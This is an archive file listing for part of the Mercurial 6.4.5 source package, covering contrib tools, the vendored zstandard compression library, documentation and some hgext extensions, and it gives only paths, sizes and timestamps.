--rw-r--r--   0 alphare   (1000) alphare   (1000)       97 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/plan9/hgrc.d/9mail.rc
--rw-r--r--   0 alphare   (1000) alphare   (1000)      128 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/plan9/hgrc.d/factotum.rc
--rw-r--r--   0 alphare   (1000) alphare   (1000)      742 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/plan9/mkfile
--rw-r--r--   0 alphare   (1000) alphare   (1000)      478 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/plan9/proto
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4269 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/pull_logger.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9205 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/pylintrc
--rw-r--r--   0 alphare   (1000) alphare   (1000)      594 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-hook-examples.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.364352 mercurial-6.4.5/contrib/python-zstandard/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1484 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/LICENSE
--rw-r--r--   0 alphare   (1000) alphare   (1000)      139 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/MANIFEST.in
--rw-r--r--   0 alphare   (1000) alphare   (1000)    35617 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/NEWS.rst
--rw-r--r--   0 alphare   (1000) alphare   (1000)    62506 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/README.rst
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.368352 mercurial-6.4.5/contrib/python-zstandard/c-ext/
--rw-r--r--   0 alphare   (1000) alphare   (1000)    23805 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/c-ext/bufferutil.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11571 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/c-ext/compressionchunker.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11668 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/c-ext/compressiondict.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)    17529 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/c-ext/compressionparams.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18152 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/c-ext/compressionreader.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10884 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/c-ext/compressionwriter.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6748 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/c-ext/compressobj.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)    45707 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/c-ext/compressor.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7048 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/c-ext/compressoriterator.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4761 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/c-ext/constants.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18046 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/c-ext/decompressionreader.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9111 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/c-ext/decompressionwriter.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5427 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/c-ext/decompressobj.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)    51907 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/c-ext/decompressor.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7385 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/c-ext/decompressoriterator.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4288 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/c-ext/frameparams.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8819 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/c-ext/python-zstandard.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7177 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/make_cffi.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3335 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/setup.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6048 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/setup_zstd.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.368352 mercurial-6.4.5/contrib/python-zstandard/tests/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/tests/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5825 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/tests/common.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5171 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/tests/test_buffer_util.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    60810 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/tests/test_compressor.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    29165 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/tests/test_compressor_fuzzing.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9071 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/tests/test_data_structures.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2962 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/tests/test_data_structures_fuzzing.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    54630 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/tests/test_decompressor.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    19315 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/tests/test_decompressor_fuzzing.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      274 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/tests/test_estimate_sizes.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1900 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/tests/test_module_attributes.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2892 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/tests/test_train_dictionary.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.368352 mercurial-6.4.5/contrib/python-zstandard/zstandard/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2390 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstandard/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    83092 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstandard/cffi.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.368352 mercurial-6.4.5/contrib/python-zstandard/zstd/
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18091 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/COPYING
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1530 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/LICENSE
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.368352 mercurial-6.4.5/contrib/python-zstandard/zstd/common/
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18345 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/bitstream.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5545 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/compiler.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4479 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/cpu.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1912 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/debug.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4960 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/debug.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9554 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/entropy_common.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2873 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/error_private.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2305 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/error_private.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    33031 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/fse.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11202 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/fse_decompress.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)    19952 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/huf.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    14933 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/mem.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11059 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/pool.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2544 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/pool.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6667 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/pythoncapi_compat.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2819 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/threading.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5286 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/threading.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    29099 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/xxhash.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12781 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/xxhash.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2673 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/zstd_common.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3751 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/zstd_errors.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12480 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/common/zstd_internal.h
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.368352 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/
--rw-r--r--   0 alphare   (1000) alphare   (1000)    27542 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/fse_compress.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8544 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/hist.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4504 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/hist.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    32772 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/huf_compress.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)   172484 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_compress.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)    40937 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_compress_internal.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5855 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_compress_literals.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1224 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_compress_literals.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    19037 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_compress_sequences.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1910 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_compress_sequences.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    19166 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_cwksp.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    25278 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_double_fast.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1283 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_double_fast.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    21936 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_fast.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1203 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_fast.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    51720 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_lazy.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2745 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_lazy.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    23858 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_ldm.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3850 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_ldm.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    57582 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_opt.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2016 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_opt.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    92625 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstdmt_compress.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9112 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstdmt_compress.h
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.368352 mercurial-6.4.5/contrib/python-zstandard/zstd/decompress/
--rw-r--r--   0 alphare   (1000) alphare   (1000)    50486 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/decompress/huf_decompress.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8874 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/decompress/zstd_ddict.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1308 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/decompress/zstd_ddict.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    72690 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/decompress/zstd_decompress.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)    56849 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/decompress/zstd_decompress_block.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2030 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/decompress/zstd_decompress_block.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6992 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/decompress/zstd_decompress_internal.h
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.368352 mercurial-6.4.5/contrib/python-zstandard/zstd/deprecated/
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11500 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/deprecated/zbuff.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1003 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/deprecated/zbuff_common.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5334 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/deprecated/zbuff_compress.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1919 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/deprecated/zbuff_decompress.c
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.368352 mercurial-6.4.5/contrib/python-zstandard/zstd/dictBuilder/
--rw-r--r--   0 alphare   (1000) alphare   (1000)    42155 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/dictBuilder/cover.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4569 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/dictBuilder/cover.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    54649 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/dictBuilder/divsufsort.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2419 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/dictBuilder/divsufsort.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    28051 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/dictBuilder/fastcover.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)    43760 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/dictBuilder/zdict.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)    17203 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/dictBuilder/zdict.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)   119972 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd/zstd.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9897 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python-zstandard/zstd.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4572 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python3-ratchet.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    17216 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/python3-whitelist
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6342 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/relnotes
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)    10429 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/revsetbenchmarks.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)      853 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/setup-pytype.sh
--rw-r--r--   0 alphare   (1000) alphare   (1000)      679 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/showstack.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4007 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/simplemerge
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18553 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/synthrepo.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1581 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/tcsh_completion
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1955 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/tcsh_completion_build.sh
--rw-r--r--   0 alphare   (1000) alphare   (1000)    19926 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/testparseutil.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1403 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/undumprevlog
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.368352 mercurial-6.4.5/contrib/vagrant/
--rw-r--r--   0 alphare   (1000) alphare   (1000)       80 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/vagrant/README.md
--rw-r--r--   0 alphare   (1000) alphare   (1000)      415 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/vagrant/Vagrantfile
--rw-r--r--   0 alphare   (1000) alphare   (1000)      292 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/vagrant/provision.sh
--rw-r--r--   0 alphare   (1000) alphare   (1000)      314 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/vagrant/run-tests.sh
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.368352 mercurial-6.4.5/contrib/vim/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      859 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/vim/HGAnnotate.vim
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3533 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/vim/hg-menu.vim
--rw-r--r--   0 alphare   (1000) alphare   (1000)    58353 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/vim/hgcommand.vim
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1415 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/vim/hgtest.vim
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4024 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/vim/patchreview.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)    27369 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/vim/patchreview.vim
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.368352 mercurial-6.4.5/contrib/win32/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4670 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/win32/ReadMe.html
--rw-r--r--   0 alphare   (1000) alphare   (1000)      267 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/win32/buildlocal.bat
--rw-r--r--   0 alphare   (1000) alphare   (1000)      509 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/win32/hg.bat
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4885 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/win32/hgwebdir_wsgi.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2238 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/win32/mercurial.ico
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2416 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/win32/mercurial.ini
--rw-r--r--   0 alphare   (1000) alphare   (1000)      248 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/win32/postinstall.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1227 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/xml.rnc
--rw-r--r--   0 alphare   (1000) alphare   (1000)    48881 2023-06-22 09:18:26.000000 mercurial-6.4.5/contrib/zsh_completion
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.372352 mercurial-6.4.5/doc/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1475 2023-06-22 09:18:26.000000 mercurial-6.4.5/doc/Makefile
--rw-r--r--   0 alphare   (1000) alphare   (1000)      416 2023-06-22 09:18:26.000000 mercurial-6.4.5/doc/README
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     6306 2023-06-22 09:18:26.000000 mercurial-6.4.5/doc/check-seclevel.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1920 2023-06-22 09:18:26.000000 mercurial-6.4.5/doc/docchecker
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)    11089 2023-06-22 09:18:26.000000 mercurial-6.4.5/doc/gendoc.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2489 2023-06-22 09:18:49.000000 mercurial-6.4.5/doc/hg-ssh.8
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5003 2023-06-22 09:18:50.000000 mercurial-6.4.5/doc/hg-ssh.8.html
--rw-r--r--   0 alphare   (1000) alphare   (1000)   488192 2023-06-22 09:18:50.000000 mercurial-6.4.5/doc/hg.1
--rw-r--r--   0 alphare   (1000) alphare   (1000)   780098 2023-06-22 09:18:51.000000 mercurial-6.4.5/doc/hg.1.html
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4995 2023-06-22 09:18:50.000000 mercurial-6.4.5/doc/hgignore.5
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8114 2023-06-22 09:18:51.000000 mercurial-6.4.5/doc/hgignore.5.html
--rw-r--r--   0 alphare   (1000) alphare   (1000)    33848 2023-06-22 09:18:26.000000 mercurial-6.4.5/doc/hgmanpage.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)   134509 2023-06-22 09:18:50.000000 mercurial-6.4.5/doc/hgrc.5
--rw-r--r--   0 alphare   (1000) alphare   (1000)   197639 2023-06-22 09:18:51.000000 mercurial-6.4.5/doc/hgrc.5.html
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1998 2023-06-22 09:18:26.000000 mercurial-6.4.5/doc/runrst
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5415 2023-06-22 09:18:26.000000 mercurial-6.4.5/doc/style.css
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1708 2023-06-22 09:18:26.000000 mercurial-6.4.5/hg
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.372352 mercurial-6.4.5/hgdemandimport/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2585 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgdemandimport/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5451 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgdemandimport/demandimportpy3.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1645 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgdemandimport/tracing.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1226 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgeditor
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.372352 mercurial-6.4.5/hgext/
--rw-r--r--   0 alphare   (1000) alphare   (1000)       67 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    41869 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/absorb.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    14438 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/acl.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2349 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/amend.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4171 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/automv.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3128 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/beautifygraph.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6906 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/blackbox.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3766 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/bookflow.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    42492 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/bugzilla.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3973 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/censor.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2362 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/children.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7762 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/churn.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10806 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/clonebundles.py
